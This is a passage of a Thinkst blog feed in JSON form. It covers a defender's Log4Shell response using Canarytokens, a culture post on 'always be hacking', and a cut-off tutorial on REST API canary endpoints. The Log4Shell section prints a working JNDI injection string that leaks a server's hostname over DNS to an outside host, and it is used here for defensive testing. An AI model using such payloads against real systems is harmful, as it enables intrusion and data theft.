src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBgKSjJZ1O-W3arPhDj-x_DUc3W5tuCF8VKic7L4LOlvvzj_fSwMVh14h3sErcP1Xzeq5qg_plN-C6-nvQfnPNBoskYZRZ-I_MJtes1I6ga75U1dX_YXnBvsJ9OXxgpedN3F-gYNFP_hibYXDOpX97g2uskYmu9LPp1J6rVcU4z_C7LwAF4yLjNFs_/w640-h360/Log4j-Timeline-1.png?resize=640%2C360&#038;ssl=1\" width=\"640\" /></a></div>\n<p style=\"text-align: justify;\">When suddenly Log4J was announced, the Red Team reached out privately, Thursday, December 9, late in the afternoon, and informed us we had edge servers vulnerable to this attack, and asked if we could test and validate. This gave our team a head-start in understanding the impact and urgency of this exploit.</p>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzeFiksDbjjjcBKqxc4bdk1szHeLKAkBNMMNtRVo3wkc67oyupNUiIdFMwoKZIhWYuSRJzaI5qYgpbDVYwihhpFxWXryjHvguVvYin30H10D6HQLbkrlW5oPokhx8moine7qhKqqmJTAv4WFS36deTQR9whEyLNKV7JCK6kySfVuZNDA4c5X5ff0U9/s735/2022-08-29_23-21-44.png?ssl=1\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"344\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzeFiksDbjjjcBKqxc4bdk1szHeLKAkBNMMNtRVo3wkc67oyupNUiIdFMwoKZIhWYuSRJzaI5qYgpbDVYwihhpFxWXryjHvguVvYin30H10D6HQLbkrlW5oPokhx8moine7qhKqqmJTAv4WFS36deTQR9whEyLNKV7JCK6kySfVuZNDA4c5X5ff0U9/w640-h344/2022-08-29_23-21-44.png?resize=640%2C344&#038;ssl=1\" width=\"640\" /></a></div>\n<p style=\"clear: both; text-align: justify;\">The initial focus was on internal application and services. We hadn\u2019t yet considered that this attack might affect our 3rd Party External infrastructure. At the time, we had some early python scripts to test and validate. Initial compromise and uses of this exploit were of the \u201cexploit and call back variety\u201d . So you would exploit the server, and it would attempt to download a second stage. This was mitigated by our External Firewall rules restricting outbound callbacks. However, we began to see over the next few days that a DNS variety (as depicted in the graphic above) was emerging that could exfiltrate keys or other sensitive host settings over DNS. We were able to verify our DNS logs were accurately recording lookup attempts traceable back to endpoints as well.</p>\n<p style=\"clear: both; text-align: left;\">Around this time the canarytokens.org site began to publish free Log4J token strings.</p>\n<div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjs6-RUVuiwuipmi4lyRLI8kg64q_wfQEfzGcUz-NwJ2ru65R0ofgX5qIGDqePzXhN-tBf05JWbiSh2TWGfMEJbZEiadqyFRgUEnV6FMYfWYFvduLjFM2x_e9MS37mDsqMIs9fCmUXyvcdB3Yfc_P0N2O4BqaGXVeCgO1htq_LCWVMhpJy41SEar4W4/s1226/2022-08-29_23-25-27.png?ssl=1\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" height=\"370\" src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjs6-RUVuiwuipmi4lyRLI8kg64q_wfQEfzGcUz-NwJ2ru65R0ofgX5qIGDqePzXhN-tBf05JWbiSh2TWGfMEJbZEiadqyFRgUEnV6FMYfWYFvduLjFM2x_e9MS37mDsqMIs9fCmUXyvcdB3Yfc_P0N2O4BqaGXVeCgO1htq_LCWVMhpJy41SEar4W4/w640-h370/2022-08-29_23-25-27.png?resize=640%2C370&#038;ssl=1\" width=\"640\" /></a></div>\n<p style=\"clear: both; text-align: justify;\">These were immediately useful for our team to help test and validate any mitigation and controls we had deployed. So we started to create 10-12 Canarytokens, so we could test and review settings. While this may not have been the intended use of those, it really helped our team isolate and contain vulnerable systems, by ensuring we had a safe way to really test the exploit.</p>\n<p style=\"clear: both; text-align: justify;\">Sample Log4J exploit, sends hostname out over DNS:</p>\n<pre style=\"clear: both; text-align: center;\"><i>${jndi:ldap://x${hostName}.L4J.jfc0qgg96a8pet4ciyg3kx50b.canarytokens.com/a}</i></pre>\n<p style=\"clear: both; text-align: justify;\">So Canarytokens, for Log4Shell were immensely valuable to our security team, since we could reliably test, nor attempt to use sketch public exploit code, etc\u2026</p>\n<h3 style=\"clear: both; text-align: left;\">Key learnings</h3>\n<p style=\"clear: both; text-align: justify;\">Each of these scenarios helped us learn about how to use Canaries and tokens as part of our security practice. Each of the key learnings are listed below in case they help you with your deployment:</p>\n<p style=\"clear: both;\">\n<ol style=\"text-align: left;\">\n<li>SSH Canary &#8211; Integrating alert data into existing tools even across teams can provide more insights than a single alert alone.</li>\n<li>Cyber Insurance Documents &#8211; Putting the context for what would be unauthorized access in the token comment allowed for immediate identification of malicious behavior versus someone inadvertently opening the wrong file that they were supposed to be accessing.</li>\n<li>Alerts that shouldn&#8217;t happen &#8211; Even for areas where you are pretty sure you have things covered, Canaries and Canarytokens are a quick way to let you know when your assumptions have broken down.</li>\n<li>Log4Shell tokens &#8211; Tokens don\u2019t have to only be used as tripwires, they can be used as a probing mechanism to understand how your environment really works to secure accordingly.</li>\n</ol>\n<h3 style=\"text-align: left;\">Closing Thoughts</h3>\n<p style=\"text-align: justify;\">I have written here about four scenarios. I think the operational impact of canaries cannot be understated, for teams with limited budget and support, Canaries and Canarytokens punch well above their weight class. The alerting pipeline and infrastructure as well are incredibly useful. However, it is also important to remember that a Canary alert is never enough to completely convict or evict an adversary. These, in my opinion, are like smoke alarms, or a motion sensor alert. It will take teams working together and ensuring their birds are cared for and tested and ready to go\u2013much like changing the batteries in your home smoke detectors! Teams may want to periodically ensure they have what they need to respond to an alert. Even among all the other tools we had deployed, from Endpoint to WAF, using Canaries helped our team increase the range of our detection capabilities further into the network.</p>\n<p style=\"text-align: justify;\">We hope these examples spark your interest and curiosity into ways organizations are getting value from Canaries and Canarytokens.</p>\n<p style=\"text-align: left;\">Thank you for reading.</p>"
                }
            ],
            "wfw_commentrss": "https://blog.thinkst.com/2022/08/canaries-as-network-motion-sensors.html/feed",
            "slash_comments": "1",
            "post-id": "13"
        },
        {
            "title": "Always be Hacking\u2026",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Always be Hacking\u2026"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://blog.thinkst.com/2022/08/always-be-hacking.html"
                }
            ],
            "link": "https://blog.thinkst.com/2022/08/always-be-hacking.html",
            "comments": "https://blog.thinkst.com/2022/08/always-be-hacking.html#comments",
            "authors": [
                {
                    "name": "haroon meer"
                }
            ],
            "author": "haroon meer",
            "author_detail": {
                "name": "haroon meer"
            },
            "published": "Sat, 27 Aug 2022 20:04:00 +0000",
            "published_parsed": [
                2022,
                8,
                27,
                20,
                4,
                0,
                5,
                239,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://blog.thinkst.com/2022/08/27/always-be-hacking/",
            "guidislink": false,
            "summary": "We discussed this Scott Forstall clip internally and figured it was worth sharing since theres so much going on in just 5 minutes. Bradley commented on how familiar it felt to how we roll and it\u2019s worth digging in to this little more. Quick Background In 2007 Apple was not yet a trillion dollar company, but its star was definitely on the rise. Jobs was back, OSX was taking root and the iPod was game changer. (Their market cap was ~$174 Billion). Demo Prep. They are about to demo the iPhone in a few months and already you notice them sweating the presentation details. Should the CEO of AT&#38;T be on stage? When do we read him in? You can watch a zillion tech demos, and you will find demo\u2019ers who look like they practiced on the plane ride in.. instead, this is thoughtful craft. Getting AT&#38;T excited So they are flying to Vegas to show AT&#38;T the phones. Notice again, it\u2019s not just \u201chere\u2019s an invite to our launch \u2013 you can have a speaking slot\u201d where some big-shot CEO can waffle about the synergy between the two companies. They want him bought in.. They are going to demo [&#8230;]",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "We discussed this Scott Forstall clip internally and figured it was worth sharing since theres so much going on in just 5 minutes. Bradley commented on how familiar it felt to how we roll and it\u2019s worth digging in to this little more. Quick Background In 2007 Apple was not yet a trillion dollar company, but its star was definitely on the rise. Jobs was back, OSX was taking root and the iPod was game changer. (Their market cap was ~$174 Billion). Demo Prep. They are about to demo the iPhone in a few months and already you notice them sweating the presentation details. Should the CEO of AT&#38;T be on stage? When do we read him in? You can watch a zillion tech demos, and you will find demo\u2019ers who look like they practiced on the plane ride in.. instead, this is thoughtful craft. Getting AT&#38;T excited So they are flying to Vegas to show AT&#38;T the phones. Notice again, it\u2019s not just \u201chere\u2019s an invite to our launch \u2013 you can have a speaking slot\u201d where some big-shot CEO can waffle about the synergy between the two companies. They want him bought in.. They are going to demo [&#8230;]"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://blog.thinkst.com/feed",
                    "value": "<p>We discussed this Scott Forstall clip internally and figured it was worth sharing since theres so much going on in just 5 minutes.</p>\n<p>Bradley commented on how familiar it felt to how we roll and it\u2019s worth digging in to this little more.</p>\n<h3 style=\"text-align: left;\">Quick Background</h3>\n<p>In 2007 Apple was not yet a trillion dollar company, but its star was definitely on the rise. Jobs was back, OSX was taking root and the iPod was game changer. (Their market cap was ~$174 Billion).</p>\n<h3 style=\"text-align: left;\">Demo Prep.</h3>\n<p>They are about to demo the iPhone in a few months and already you notice them sweating the presentation details. Should the CEO of AT&amp;T be on stage? When do we read him in?</p>\n<p>You can watch a zillion tech demos, and you will find demo\u2019ers who look like they practiced on the plane ride in.. instead, this is thoughtful craft.</p>\n<h3 style=\"text-align: left;\">Getting AT&amp;T excited</h3>\n<p>So they are flying to Vegas to show AT&amp;T the phones.</p>\n<p>Notice again, it\u2019s not just \u201chere\u2019s an invite to our launch \u2013 you can have a speaking slot\u201d where some big-shot CEO can waffle about the synergy between the two companies. They want him bought in..</p>\n<p>They are going to demo to blow his socks off because that\u2019s going to make his talk different too..</p>\n<p>(On a much smaller scale) We\u2019ve been using this technique for a while too. For almost every podcast we\u2019ve advertised on, we first requested a private demo with the hosts. You can tell the difference in how they read our ad before and after seeing the demo. You can pay hundreds of thousands of dollars, but you can\u2019t buy that difference in their voice when they\u2019ve seen the win.</p>\n<h3 style=\"text-align: left;\">Leaving things to chance</h3>\n<p>Now.. the iPhone is clearly revolutionary\u2026 In another part of the interview (included in <a href=\"https://www.youtube.com/watch?v=IiuVggWNqSA\" rel=\"nofollow\" target=\"_blank\">the full clip</a>) Forstall mentions how at that point, it was obvious to them that the iPhone would win. He was using it, and knew it was the future, but with all that confidence they were still leaving nothing to chance.. they are going to demo it and Forstall is planning around it:</p>\n</p>\n<ul style=\"text-align: left;\">\n<li>Is there going to be good cell signal/service in the penthouse or will our demos look bad because of it?</li>\n</ul>\n<p>Again. It\u2019s such dedication to the craft. They have the Jesus-phone. You are talking to a seasoned exec. You could totally hand wave past the bad connectivity.</p>\n<p><b>But.They.Don\u2019t.</b></p>\n<p>They want to make sure it pops out of their bag and works.</p>\n<p>The option for using 4-Seasons Wi-Fi is great and what\u2019s clear again is their dedication to removing the suck from the experience. Anyone would have understood \u201clet me just join the Wi-Fi\u2026 -fiddle- these pesky things -fiddle-\u201c but they don\u2019t. They are working on it before they leave Cupertino.</p>\n<p>I also think it\u2019s awesome that Forstall himself is sweating these details. He\u2019s the head of engineering at a $100 billion dollar company. He isn\u2019t sitting in the suite while IT makes it happen and this isn\u2019t just fake egalitarian kayfabe. It\u2019s a hardwired culture of biasing to action / just making it happen.</p>\n<h3 style=\"text-align: left;\">Relentlessly Resourceful</h3>\n<p>(It\u2019s subtle, but) Notice also, that they didn\u2019t land the solution because he played his Apple Card. He landed it by acting like an AT&amp;T exec and using their weight. Anyone coulda done this (but very few ppl woulda).</p>\n<p>Paul Graham has a famous term when talking about great startup founders. He calls them \u201c<a href=\"http://www.paulgraham.com/relres.html\" rel=\"nofollow\" target=\"_blank\">relentlessly resourceful.</a>\u201d</p>\n<blockquote>\n<p>A couple days ago I finally got being a good startup founder down to two words: relentlessly resourceful.</p>\n<p>Till then the best I\u2019d managed was to get the opposite quality down to one: hapless. Most dictionaries say hapless means unlucky. But the dictionaries are not doing a very good job. A team that outplays its opponents but loses because of a bad decision by the referee could be called unlucky, but not hapless. Hapless implies passivity. To be hapless is to be battered by circumstances\u2014to let the world have its way with you, instead of having your way with the world.</p>\n<p>Unfortunately there\u2019s no antonym of hapless, which makes it difficult to tell founders what to aim for. \u201cDon\u2019t be hapless\u201d is not much of rallying cry.</p>\n<p>\u2026</p>\n<p>But finally I\u2019ve figured out how to express this quality directly.</p>\n<p>\u2026</p>\n<p>What would someone who was the opposite of hapless be like? They\u2019d be relentlessly resourceful. Not merely relentless. That\u2019s not enough to make things go your way except in a few mostly uninteresting domains. In any interesting domain, the difficulties will be novel. Which means you can\u2019t simply plow through them, because you don\u2019t know initially how hard they are; you don\u2019t know whether you\u2019re about to plow through a block of foam or granite. So you have to be resourceful. You have to keep trying new things.</p>\n<p>Be relentlessly resourceful.</p>\n</blockquote>\n<p>What you see from the Forstall conversation (which seems obvious in retrospect) is that this isn\u2019t just a requirement for startups. <b>Relentlessly Resourceful </b>is why Apple pulls off the iPod with a small team. It\u2019s why they prototype the iPhone with a tiny team. It\u2019s why they consistently manage to do what they do. Lots and lots of companies have more engineers than they do, and lots of companies have smart execs\u2026 but.. all the money can\u2019t buy you smart execs / engineers who default to action and find their way around walls (instead of just pointing out that the walls exist). That bit is culture.</p>\n<p>Relentlessly Resourceful can almost be written as \u201c<b>always be hacking</b>\u201d. We built Thinkst for this. We don\u2019t just want the hacks to build our company, we built our company so we can do awesomer and awesomer hacks.</p>\n<p>So far, it&#8217;s been great for us. It\u2019s leet to see (when you look at Apple) that it scales <img alt=\"\ud83d\ude42\" class=\"wp-smiley\" src=\"https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png\" style=\"height: 1em;\" /></p>"
                }
            ],
            "wfw_commentrss": "https://blog.thinkst.com/2022/08/always-be-hacking.html/feed",
            "slash_comments": "1",
            "post-id": "21"
        },
        {
            "title": "Creating REST API Canary endpoints",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Creating REST API Canary endpoints"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://blog.thinkst.com/2022/07/creating-rest-api-canary-endpoints.html"
                }
            ],
            "link": "https://blog.thinkst.com/2022/07/creating-rest-api-canary-endpoints.html",
            "comments": "https://blog.thinkst.com/2022/07/creating-rest-api-canary-endpoints.html#respond",
            "authors": [
                {
                    "name": "Casey Smith"
                }
            ],
            "author": "Casey Smith",
            "author_detail": {
                "name": "Casey Smith"
            },
            "published": "Thu, 21 Jul 2022 23:37:00 +0000",
            "published_parsed": [
                2022,
                7,
                21,
                23,
                37,
                0,
                3,
                202,
                0
            ],
            "tags": [
                {
                    "term": "Uncategorized",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://blog.thinkst.com/2022/07/21/creating-rest-api-canary-endpoints/",
            "guidislink": false,
            "summary": "Given the importance of REST API endpoints for most networks and applications, we wanted a way to use (existing) Canarytokens, or Canaries to detect unauthorized access to a REST API. (Like all things Canary) We wanted something easy to use that delivers immediate value. Here we present several new approaches, and look forward to hearing from the community on the usefulness and ways to increase insight here for network defenders. Challenge:\u00a0 APIs are everywhere and permeate most organization&#8217;s daily web based workflows. Both internal and external services often rely on the use of REST APIs. From workstation management to web applications, from complex business logic and application integrations, to payment processing services, APIs form a backbone for all kinds of crucial services.\u00a0 It started us thinking, how we might be able to create and use Canaries and Canaryokens to catch or detect unauthorized REST API endpoint or key usage? Our end goal would be for teams to receive an alert when an API key, or tokened URL endpoint they want to monitor, is used by an attacker. (The AWS API-key is already our most popular Canarytoken, with hundreds of thousands deployed world wide, but we wanted to mint API keys [&#8230;]",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://blog.thinkst.com/feed",
                "value": "Given the importance of REST API endpoints for most networks and applications, we wanted a way to use (existing) Canarytokens, or Canaries to detect unauthorized access to a REST API. (Like all things Canary) We wanted something easy to use that delivers immediate value. Here we present several new approaches, and look forward to hearing from the community on the usefulness and ways to increase insight here for network defenders. Challenge:\u00a0 APIs are everywhere and permeate most organization&#8217;s daily web based workflows. Both internal and external services often rely on the use of REST APIs. From workstation management to web applications, from complex business logic and application integrations, to payment processing services, APIs form a backbone for all kinds of crucial services.\u00a0 It started us thinking, how we might be able to create and use Canaries and Canaryokens to catch or detect unauthorized REST API endpoint or key usage? Our end goal would be for teams to receive an alert when an API key, or tokened URL endpoint they want to monitor, is used by an attacker. (The AWS API-key is already our most popular Canarytoken, with hundreds of thousands deployed world wide, but we wanted to mint API keys [&#8230;]"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://blog.thinkst.com/feed",
                    "value": "<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">Given the importance of REST API endpoints for most networks and applications, we wanted a way to use (existing) Canarytokens, or Canaries to detect unauthorized access to a REST API. </span></span></p>\n<p><span style=\"font-family: Arial;\"><span style=\"font-size: 14.6667px; white-space: pre-wrap;\">(Like all things Canary) We wanted something easy to use that delivers immediate value. Here we present several new approaches, and look forward to hearing from the community on the usefulness and ways to increase insight here for network defenders.</span></span></p>\n<p><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; white-space: pre-wrap;\">Challenge:\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; white-space: pre-wrap;\">APIs are everywhere and permeate most organization&#8217;s daily web based workflows. Both internal and external services often rely on the use of REST APIs. From workstation management to web applications, from complex business logic and application integrations, to payment processing services, APIs form a backbone for all kinds of crucial services.\u00a0</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">It started us thinking, how we might be able to create and use Canaries and Canaryokens to catch or detect unauthorized REST API endpoint or key usage? Our end goal would be for teams to receive an alert when an API key, or tokened URL endpoint they want to monitor, is used by an attacker.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 10pt; font-style: italic; vertical-align: baseline; white-space: pre-wrap;\">(The</span><a href=\"https://blog.thinkst.com/2017/09/canarytokens-new-member-aws-api-key.html\"> <span style=\"color: #1155cc; font-family: Arial; font-size: 10pt; font-style: italic; vertical-align: baseline; white-space: pre-wrap;\">AWS API-key is already our most popular Canarytoken</span></a><span style=\"font-family: Arial; font-size: 10pt; font-style: italic; vertical-align: baseline; white-space: pre-wrap;\">, with hundreds of thousands deployed world wide, but we wanted to mint API keys for our own internal services and have them be as useful)</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Solution:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">At its core, a REST API call is an HTTP request. What we need is a way to receive a request, log relevant headers or parameters and HTTP methods, then send an alert to the Canary console.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We can do that.</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">There are already a number of HTTP request related primitives built into Canaries and Canarytokens. We can easily leverage these to create a REST API Canary endpoint. This allows defenders to quickly gain insight into unauthorized use of REST APIs within their organization with low setup costs.\u00a0\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\">\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We will show three types of REST APIs you can consider using:</span></p>\n<p dir=\"ltr\">\n<ol>\n<li dir=\"ltr\" style=\"line-height: 1.38;\"><span style=\"font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Using the simple Web Bug Canarytoken.</span></li>\n<li dir=\"ltr\" style=\"line-height: 1.38;\"><span style=\"font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Using the (fake) Webserver on a Canary.</span></li>\n<li dir=\"ltr\" style=\"line-height: 1.38;\"><span style=\"font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Creating a Custom Canary TCP Service.</span></li>\n</ol>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; font-weight: bold; vertical-align: baseline; white-space: pre-wrap;\">Setup One : </span><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Web Bug Canarytoken\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">This is the most basic form of the request, create a Web / URL Canarytoken, then leave a hint to its use in a document someplace and see if anyone ever runs a script or curl command to trigger the alert. </span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"color: #ffa400; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">We will create a Web Bug Canarytoken, annotate our Token Reminder, for later. We will then use PostMan, an API testing tool to send a sample request to start out.\u00a0</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">First we will create the Canarytoken, either in our private Canary Console or at</span><a href=\"https://canarytokens.org/generate\"> <span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">canarytokens.org</span></a><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">.\u00a0</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 480px; overflow: hidden; width: 624px;\"><img height=\"480\" src=\"https://lh5.googleusercontent.com/ZB0Zzy3xSlR6NiaWGIaqCB8QxOmBnNHuvgQaSJE6qIwAVGD7I11t8SB-hmMHdjlnE83IkyNjubFQ5gDUCvp9jjJ9hADITpzDn1RRntE6qdh9X8BgoGStPMyr52xUnPeY1Qkcn0J0bYF3bpaYBBvXeEw\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Notice the full/returned token-URL is:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><a href=\"http://canarytokens.com/traffic/ww0mayx9rro4h2l3keazj0zdk/contact.php\" rel=\"nofollow\">http://canarytokens.com/traffic/ww0mayx9rro4h2l3keazj0zdk/contact.php</a></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Next, we will modify the generated URL slightly to make it appear more like a REST API endpoint.\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">This ought to do the trick:</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><a href=\"http://canarytokens.com/api/v1/users/list/ww0mayx9rro4h2l3keazj0zdk\" rel=\"nofollow\">http://canarytokens.com/api/v1/users/list/ww0mayx9rro4h2l3keazj0zdk</a></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Remember, </span><span style=\"color: darkslategrey; font-family: Arial; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;\">this URL is just an example. Apart from the hostname and the actual token (</span><span style=\"color: red; font-family: Arial; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;\">in red</span><span style=\"color: darkslategrey; font-family: Arial; font-size: 12pt; vertical-align: baseline; white-space: pre-wrap;\">), you can change all other parts of the token-URL.</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Test with a curl command</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: transparent; color: #24292f; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">curl </span><span style=\"background-color: white; color: #212121; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"><a href=\"http://canarytokens.com/api/v1/users/list/ww0mayx9rro4h2l3keazj0zdk\" rel=\"nofollow\">http://canarytokens.com/api/v1/users/list/ww0mayx9rro4h2l3keazj0zdk</a></span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"background-color: white; color: #212121; font-family: 'Courier New'; font-size: 11pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">\u00a0</span></p>\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Or send requests and track responses with a tool like</span><a href=\"https://www.postman.com/\"> <span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">Postman</span></a><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">\u00a0</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 100px; overflow: hidden; width: 624px;\"><img height=\"100\" src=\"https://lh4.googleusercontent.com/axWgmEsyKOtyknvebaoHDDU62EDuid6elLSTAnYhvC8k_5OkN_f27rqcWyszHLOJ5zHqXlGWORUS9DI73oq5coKjyIihmCMCpST2MeqKZxjG5Vqqmyv46Khht-YmK0gZAySJsRlOdax2_iYUEUR2xlc\" style=\"margin-left: 0; margin-top: 0;\" width=\"624\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">This generates the expected alert:</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\"><span style=\"border: none; display: inline-block; height: 491px; overflow: hidden; width: 536px;\"><img height=\"491\" src=\"https://lh5.googleusercontent.com/xlDA1tfsa02_XczAX3LBQgL9GNoYFpCDwmahC3Cgf2VuovTKAlZP7XgsgAxDq5XGgzlp6bNj9SZa8cRef9A_FHvoKnUo3mrewoDJ6fRofNfyuYE3FIKWZe5xREIXukMskEIGCbHI4RUkFSGDzPjsvj0\" style=\"margin-left: 0; margin-top: 0;\" width=\"536\" /></span></span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">This is a simple example to showcase the captured HTTP request, source IP address and the User-Agent string. We can see the utility of a quick alert or signal that someone finds this url interesting (and by extension that someone had access to the place it was stored).</span></p>\n<p dir=\"ltr\">\n<p dir=\"ltr\" style=\"line-height: 1.656; margin-bottom: 0; margin-top: 0;\"><span style=\"font-family: Arial; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;\">However, it is pretty clear by the hostname, that we are hitting a Canarytoken URL. Teams using our commercial Canary offering have the ability to use a custom domain. 